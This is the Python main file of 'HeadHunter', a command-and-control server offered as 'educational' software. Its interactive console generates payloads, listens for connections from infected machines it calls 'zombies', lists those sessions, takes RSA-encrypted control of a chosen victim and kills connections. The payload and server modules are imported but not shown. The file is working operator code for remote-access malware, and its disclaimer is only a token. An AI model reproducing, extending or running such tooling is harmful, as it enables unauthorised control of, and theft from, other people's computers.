# HeadHunter (C2) server
# Author: Logan Goins
# Contributor: 0d1nss0n
# I am not liable for any misuse of this software.
# This software is for educational purposes only

from src import server
from src import generate
import sys
import rsa
import os

# ANSI escape codes for text colors
class Color:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    RESET = "\033[0m"

def print_colored(text, color):
    print(f"{color}{text}{Color.RESET}")

print(
    f'''
{Color.RED}
  
 ██░ ██ ▓█████ ▄▄▄      ▓█████▄  ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
▓██░ ██▒▓█   ▀▒████▄    ▒██▀ ██▌▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▒███  ▒██  ▀█▄  ░██   █▌▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░▓█ ░██ ▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓░▒████▒▓█   ▓██▒░▒████▓ ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░ ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░   ░    ░   ▒    ░ ░  ░  ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
 ░  ░  ░   ░  ░     ░  ░   ░     ░  ░  ░   ░              ░             ░  ░   ░     
                         ░                                                           

{Color.RESET}
Command and Control Server (C2)
{Color.YELLOW}Author: Logan Goins 
{Color.BLUE}Contributors: 0d1nss0n

{Color.RESET}type "help" for available commands
''')


while True:
    command = input(f"{Color.RED}HeadHunter /> {Color.RESET}").lower().split(" ")
    print(" ")

    if len(command) >= 3:
        cmd = command[0]
        subcmd = command[1]
        arg = command[2]
    elif len(command) >= 2:
        cmd = command[0]
        subcmd = command[1]
    elif len(command) >= 1:
        cmd = command[0]
        params = [cmd]

    if cmd == "listen":
        try:
            server.listen(int(subcmd))
        except NameError:
            print("Error: please supply a port number for the server to listen on\n")
    elif cmd == "generate":
        # Create the payload output folder if it does not exist
        if not os.path.exists('output'):
            os.makedirs('output')
        generate.generate()
    elif cmd == "help":
        print(f'''
        Commands
        ---------------------------------------------------------------------------------------------------------------
        help                      --          displays this menu
        generate                  --          create a generic payload which is saved in the output folder
        listen <LPORT>            --          starts listening for zombies on the specified local port
        show connections          --          displays active zombie connections by address and source port
        control <session>         --          controls an infected zombie by session number
        kill <session>            --          terminate a zombie connection by session number
        exit                      --          exits the headhunter interactive shell
        ''')
    elif cmd == "control":
        try:
            session_number = int(subcmd)
            zombie = server.zombies[session_number - 1].c
            zombiepubkey = server.zombies[session_number - 1].public_partner
            zombie.send(rsa.encrypt(str.encode("\n"), zombiepubkey))
            print(f"Entering control mode for zombie " + subcmd + " on address " + str(
                zombie.getpeername()) + "\n")
            server.control(zombie, zombiepubkey)
        except OSError:
            print(f"{Color.YELLOW}Zombie is currently disconnected on selected session {Color.RESET}\n")
        except IndexError:
            print(f"{Color.YELLOW}Zombie does not exist {Color.RESET}\n")
    elif cmd == "kill":
        try:
            session_number = int(subcmd)
            if 1 <= session_number <= len(server.zombies):
                zombie = server.zombies[session_number - 1].c
                zombie.close()
                print(f"{Color.BLUE}Killed zombie session {session_number}{Color.RESET}\n")
            else:
                print(f"{Color.YELLOW}Zombie does not exist {Color.RESET}\n")
        except ValueError:
            print(f"{Color.YELLOW}Zombie does not exist {Color.RESET}\n")
    elif cmd == "show" and subcmd == "connections":
        try:
            session = 0
            for i in server.zombies:
                if i is not None:
                    session += 1
                    print(
                        f"session " + str(session) + " connected on address: " + str(i.c.getpeername()) + "")
            print()
        except AttributeError:
            print(f"{Color.YELLOW}Server hasn't started yet. Type \"listen <LHOST> <LPORT>\" to start listening for connections {Color.RESET}\n")
        except OSError:
            print(f"{Color.YELLOW}No zombies are currently connected {Color.RESET}\n")
    elif cmd == "exit":
        exit()
    elif cmd.strip(" ") == "":
        continue
    else:
        print(f"{Color.YELLOW}Invalid command, type \"help\" for a list of commands {Color.RESET}\n")
